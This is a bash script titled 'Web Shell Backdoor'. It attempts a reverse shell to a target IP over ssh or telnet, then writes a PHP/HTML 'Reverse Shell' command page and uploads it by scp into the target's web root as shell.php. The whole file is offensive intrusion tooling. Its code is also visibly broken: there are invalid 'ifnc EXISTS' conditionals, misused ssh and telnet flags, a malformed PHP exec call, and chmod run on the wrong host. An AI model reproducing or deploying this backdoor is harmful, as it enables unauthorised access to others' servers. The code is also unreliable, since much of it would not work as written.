#!/bin/bash

# ----------------------------------
# Web Shell Backdoor (Shell)
# ----------------------------------

# Configuration
WEBSITE_ROOT="/var/www"
COMMAND_TIMEOUT=60
SHELL_PORT=44444
SHELLSHELL="/bin/bash"

# Functions

reverse_shell() {
    local _user="www-data"
    local _group="www-data"

    if ssh -q "$_user@$1:22" >/dev/null 2>&1; then
        echo "Using SSH reverse shell..."
        ssh -p "$SHELL_PORT" -o ConnectTimeout=$COMMAND_TIMEOUT -r "$_user@$1"
        exit $?
    else
        ifnc EXISTS ./telnet.sh; then
            echo "Using Telnet reverse shell..."
            ./telnet.sh "$1"
            exit $?
        else
            # Fallback: Standard telnet if the telnet script isn't available
            telnet "$1" -load .bash > /dev/null 2>&1 && echo "Using Telnet reverse shell..." || \
            echo "Telnet reverse shell failed. Using shell by default."
        fi
    fi
}

execute_command() {
    local _shell="/$SHELLSHELL"
    local _url="$1"
    local _path="/tmp/temp.sh"

    # Write the shell code to disk
    echo "Content-Type: application/x-msdownload" > "$_path"
    echo "Content-Disposition: attachment; filename=shell.php" >> "$_path"
    echo "Content-Transfer-Encoding: binary" >> "$_path"

    # Create a basic PHP shell
    ifnc EXISTS "$_shell"; then
        echo '<?php \n\n' > "$_path"
        echo '  $command = "'"$2"'";\n' >> "$_path"
        echo '  exec("ssh -q $user@$1:22 || telnet $1 $SHELLPORT", 1, "bash"); exit;' >> "$_path"
    else
        # Create a basic shell for older systems if PHP isn't available.
        echo 'Content-Type: text/html\n\n' > "$_path"
        echo '<!DOCTYPE html>\n' >> "$_path"
        echo '<head><title>Reverse Shell</title></head>' >> "$_path"
        echo '<link rel="stylesheet" href="'"$WEBSITE_ROOT"/styles/bootstrap.min.css"> </style>' >> "$_path"
        echo '<body>\n<center>\n'  >> "$_path"
        echo '  <h1>Reverse Shell</h1>\n' >> "$_path"
        echo '  <h2>Enter command: <input type="text" name="command"></input></h3>\n' >> "$_path"
        echo '<button type="submit" class="btn btn-primary">Execute Command</button>\n' >> "$_path"
        echo '</center>' >> "$_path"
        echo '</body>\n</html>' >> "$_path"
    fi

    # Copy the file to a random location on the target server
    scp -r "$_path" "$1:$WEBSITE_ROOT/shell.php" && \
    chmod +x "$WEBSITE_ROOT/shell.php" && \
    echo "Shell uploaded to: $WEBSITE_ROOT/shell.php"

}

# Main Script Execution

if [[ -n "$1" ]]; then
  reverse_shell "$1" &
  sleep 3;
  execute_command "$1" > /dev/null 2>&1
else
  echo "Usage: ./shell.sh <target_IP>"
  exit 1
fi

echo "Backdoor shell is running..."
# Keep the script alive until manually killed (Ctrl+C)
sleep infinity
